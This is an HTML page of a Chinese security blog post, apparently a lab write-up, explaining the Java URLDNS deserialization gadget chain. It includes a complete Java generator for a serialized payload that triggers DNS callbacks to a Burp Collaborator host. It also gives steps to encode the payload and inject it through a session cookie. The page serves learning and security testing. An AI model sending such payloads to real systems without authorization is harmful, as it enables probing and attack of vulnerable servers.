@@ -1,0 +1,143 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="月岛"/><meta name="copyright" content="月岛"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="月岛的博客，月岛，技术博客，知识分享，信息安全，网络安全"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="java安全-URLDNS链 | 月岛的博客"/><meta name="apple-mobile-web-app-title" content="java安全-URLDNS链 | 月岛的博客"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2026/07/08/java安全-URLDNS链/"/><meta name="description" content="Java HashMapHashMap 是一个散列表，它存储的内容是键值对(key-value)映射。 put()函数可以将键&#x2F;值对添加到 HashMap 中 实例： 123456789101112&#x2F;&#x2F; 引入 HashMap 类      import java.util.HashMap;public class RunoobTest &#123;    public static...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java安全-URLDNS链 | 月岛的博客">
+<meta property="og:url" content="http://example.com/2026/07/08/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE/index.html">
+<meta property="og:site_name" content="月岛的博客">
+<meta property="og:description" content="Java HashMapHashMap 是一个散列表，它存储的内容是键值对(key-value)映射。 put()函数可以将键&#x2F;值对添加到 HashMap 中 实例： 123456789101112&#x2F;&#x2F; 引入 HashMap 类      import java.util.HashMap;public class RunoobTest &#123;    public static...">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/07/08/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE/assets/images/Hexo-Theme-MEOW.png">
+<meta property="article:published_time" content="2026-07-08T04:19:05.000Z">
+<meta property="article:modified_time" content="2026-07-08T04:24:25.899Z">
+<meta property="article:author" content="月岛">
+<meta property="article:tag" content="月岛的博客，月岛，技术博客，知识分享，信息安全，网络安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/07/08/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>java安全-URLDNS链 | 月岛的博客</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="stylesheet" href="/css/third-party/dist/APlayer.min.css">
+
+<link rel="stylesheet" href="/css/third-party/dist/snackbar.min.css">
+<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 8.1.1"></head><body bg-style="none"><div class="post-progressbar-container"><div class="post-progressbar"></div></div><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="Home"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="Home"><div>月岛的博客</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>Categories</span></a></div><div class="menu-item"><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>Tags</span></a></div><div class="menu-item"><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>About</span></a></div></div><div id="nav-function"><div id="menu-btn"><a href="javascript:void(0);" title="Toggle Menu"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="Home"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="Home">月岛的博客</a></div><div class="menu-aside-item"><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>Categories</span></a></div><div class="menu-aside-item"><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>Tags</span></a></div><div class="menu-aside-item"><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>About</span></a></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">「 MEOW 」</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">java安全-URLDNS链</h1><div class="post-author"><span>Author: 月岛</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>Created: 2026-07-08</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>Updated: 2026-07-08</span></div></div><div class="post-read"><div class="post-pageview"><img src="/assets/images/svg/ta/ta-fire.svg" class="icon noview" alt="Icon"><span>Hits: </span><span id="vercount_value_page_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div><div class="post-attribute"><div class="post-categories"><img src="/assets/images/svg/ta/ta-category.svg" class="icon noview" alt="Icon"><span><a class="post-categories-link" href="/categories/java%E5%AE%89%E5%85%A8/">java安全</a></span></div></div></div><div class="post markdown" indent="false"><h2 id="Java-HashMap"><a href="#Java-HashMap" class="headerlink" title="Java HashMap"></a>Java HashMap</h2><p>HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。</p>
+<p>put()函数可以将键&#x2F;值对添加到 HashMap 中</p>
+<p>实例：</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 引入 HashMap 类      </span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class RunoobTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 创建 HashMap 对象 Sites</span><br><span class="line">        HashMap&lt;Integer, String&gt; Sites = new HashMap&lt;Integer, String&gt;();</span><br><span class="line">        // 添加键值对</span><br><span class="line">        Sites.put(1, &quot;Google&quot;);</span><br><span class="line">        System.out.println(Sites);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<h2 id="URLDNS利用链"><a href="#URLDNS利用链" class="headerlink" title="URLDNS利用链"></a>URLDNS利用链</h2><div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        URL url = new URL(&quot;https://teb8v00spyotab56ycdr1x4co3uuik69.oastify.com&quot;);</span><br><span class="line">        //使用put将key置为一个url</span><br><span class="line">        map.put(url,null);</span><br><span class="line">    &#125;</span><br><span class="line">    public static  void  serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);//序列化对象</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static  void  deserialize() throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        Object o = ois.readObject();//反序列化对象</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>HashMap这个类重载readObject函数。当服务器对序列化对象进行反序列化时，会调用readObject()方法。</p>
+<img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="image-20260706153948307.png"  alt="image-20260706153948307" style="zoom:50%;" >
+
+<p>readObject函数中，调用了hash方法：</p>
+<img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="image-20260707170007273.png"  alt="image-20260707170007273" style="zoom: 67%;" >
+
+<p>进入hash方法，当key不等于NULL时，会调用hashcode()方法</p>
+<img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="image-20260707172927140.png"  alt="image-20260707172927140" style="zoom: 67%;" >
+
+<p>当key为URL时，hashcode默认为-1，会调用URL的hashcode方法：</p>
+<img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="image-20260706182701534.png"  alt="image-20260706182701534" style="zoom: 67%;" >
+
+<p>当key为url时，会进行dns查询。</p>
+<img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="image-20260706182746136.png"  alt="image-20260706182746136" style="zoom: 67%;" >
+
+<img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="image-20260706182825063.png"  alt="image-20260706182825063" style="zoom:67%;" >
+
+<img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="image-20260707175500672.png"  alt="image-20260707175500672" style="zoom: 50%;" >
+
+<h2 id="实例：Exploiting-Java-deserialization-with-Apache-Commons"><a href="#实例：Exploiting-Java-deserialization-with-Apache-Commons" class="headerlink" title="实例：Exploiting Java deserialization with Apache Commons"></a>实例：Exploiting Java deserialization with Apache Commons</h2><p>本实验使用基于序列化的会话机制。参数session是个序列化对象</p>
+<img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="image-20260708115823755.png"  alt="image-20260708115823755" style="zoom:50%;" >
+
+<p>利用URLDNS链,进行验证：</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class MyURLDNSGenerator &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        // 1. 填入你的盲测 DNS 接收域名</span><br><span class="line">        String dnsLogUrl = &quot;https://am0uyz24lcdphuqw31qcerd4evkm8cw1.oastify.com&quot;;</span><br><span class="line">        String outputFile = &quot;urldns.ser&quot;;</span><br><span class="line">        System.out.println(&quot;[*] 开始手动构建 URLDNS 链...&quot;);</span><br><span class="line"></span><br><span class="line">        // 2. 创建一个空的 HashMap 和 URL 对象</span><br><span class="line">        HashMap&lt;URL, String&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        URL url = new URL(dnsLogUrl);</span><br><span class="line"></span><br><span class="line">        // 3. 【核心技巧】利用反射获取 URL 类的私有属性 hashCode</span><br><span class="line">        Field hashCodeField =URL.class.getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line">        hashCodeField.setAccessible(true);</span><br><span class="line">        hashCodeField.set(url,233);</span><br><span class="line">        // 5. 将 URL 作为 Key 放入 HashMap</span><br><span class="line">        map.put(url, &quot;anything&quot;);</span><br><span class="line"></span><br><span class="line">        // 6. 【埋下炸弹】放完之后，再通过反射把 hashCode 强行改回 -1</span><br><span class="line">        // 这样当靶场反序列化它时，就会判定“没计算过哈希”，从而在靶场触发 DNS 请求</span><br><span class="line">        hashCodeField.set(url, -1);</span><br><span class="line"></span><br><span class="line">        // 7. 将这个“加了料”的 HashMap 序列化并写出到本地文件urldns.ser</span><br><span class="line">        FileOutputStream fos = new FileOutputStream(outputFile);</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(fos);</span><br><span class="line">        //ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(outputFile));</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line"></span><br><span class="line">        oos.close();</span><br><span class="line">        fos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;[+] Payload 生成成功！文件已保存至: &quot; + outputFile);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p> 将 Payload 转换为 Base64 编码:</p>
+<p><strong>CyberChef 操作：</strong> 将 <code>urldns.ser</code> 作为 Input 载入，左侧搜索 <strong><code>To Base64</code></strong> 拖入 Recipe，复制 Output 框生成的纯文本字符串。</p>
+<img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="image-20260708115219933.png"  alt="image-20260708115219933" style="zoom:50%;" >
+
+<p>将刚刚生成的 URLDNS Base64 字符串粘贴进去，将其替换。按下 <code>Ctrl + U</code>(进行 URL 编码为了防止 Base64 中的 <code>+</code>、<code>/</code>、<code>=</code> 等符号在 HTTP 传输中被解析错误)。</p>
+<img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="image-20260708115320783.png"  alt="image-20260708115320783" style="zoom:50%;" >
+
+<p>发送</p>
+<p>回到 <strong>Burp Collaborator</strong> 窗口，点击 <strong>Poll now</strong>。弹出了几条全新的记录</p>
+<img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="image-20260708115347720.png"  alt="image-20260708115347720" style="zoom:50%;" >
+
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/1vxyz/p/17231164.html">https://www.cnblogs.com/1vxyz/p/17231164.html</a></p>
+</div><div class="post-tail-tags"></div><div class="post-nav"><a class="post-nav-prev" nopost=""></a><a class="post-nav-next" href="/2026/07/04/nacos%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="nacos历史漏洞复现">Next post<span>nacos历史漏洞复现</span></a></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>Table Of Content</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Java-HashMap"><span class="toc-list-text">Java HashMap</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#URLDNS%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-list-text">URLDNS利用链</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%AE%9E%E4%BE%8B%EF%BC%9AExploiting-Java-deserialization-with-Apache-Commons"><span class="toc-list-text">实例：Exploiting Java deserialization with Apache Commons</span></a></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="Dark Mode" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="Share" type="button" data-text="http://example.com/2026/07/08/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="Increase Font Size" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="Decrease Font Size" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="Settings" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="Table Of Content" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="Go To Top" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div id="music-player"></div></main><footer><div class="footer"><div id="footer-copyright">© 2026 <span>💗</span> <a href="/about#%20Url%20for%20the%20link%20of%20author">月岛</a></div><div id="footer-info"><div id="footer-framework">🚀Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.3.1" target="_blank">Meow</a></div><div id="footer-runtime"><span id="runtime" data-startdate="2026-03-05T22:16:20.000Z">🌻Blog Runtime: . Years . Months . Days</span></div></div><div id="footer-pageview"></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
+  root: '/',
+  toolbar: true,
+  lazyload_src: '/assets/images/Meow-Loading.webp',
+  friends: false,
+  album: '',
+  codeblock: true,
+  code_copy_text: false,
+  share_text: '',
+  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
+  mouse_click: false,
+  notify:{
+    enable: true,
+    info: 'Copied successfully! Please mark the address of this post if redistribute.',
+    f12_info: 'Turned on developer mode, please follow the copyright license of this website'
+  },
+  search: {
+    enable: false,
+    path: '',
+    local: {
+      top_n_per_article: 1,
+      preload: false
+    }
+  },
+  encrypt: false,
+};
+</script><script>if (!localStorage.getItem('color-mode')) {
+  localStorage.setItem('color-mode', 'light' || 'light');
+}
+document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
+</script>
+<script src="/js/theme/tools/utils.js"></script>
+
+<script src="/js/plugins/dist/lazyload.min.js"></script>
+
+<script src="/js/plugins/view-image.min.js"></script>
+<script src="https://events.vercount.one/js" defer="defer"></script><script>if (localStorage.getItem('font-size')) {
+  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
+}
+</script>
+<script src="/js/plugins/dist/APlayer.min.js"></script>
+<script>const initAplayer = (data) => {
+  if (!data.length) return;
+
+  const ap = new APlayer({
+    container: document.getElementById('music-player'),
+    fixed: true,
+    autoplay: false,
+    theme: '#FFB347',
+    loop: 'all',
+    order: 'list',
+    volume: 0.7,
+    lrcType: 3,
+    audio: data
+  });
+
+  ap.on('play', () => {
+    document.getElementById('music-player').setAttribute("play", "");
+  });
+  ap.on('pause', () => {
+    document.getElementById('music-player').removeAttribute("play");
+  });
+};
+
+const fetchData = () => {
+  fetch('')
+    .then(res => res.json())
+    .then(result => initAplayer(result));
+};
+
+if ('') {
+  document.addEventListener("DOMContentLoaded", fetchData);
+} else {
+  document.addEventListener("DOMContentLoaded", initAplayer());;
+}</script>
+<script src="/js/plugins/dist/snackbar.min.js"></script>
+
+<script src="/js/main.js" type="module"></script>
+</div></body></html>
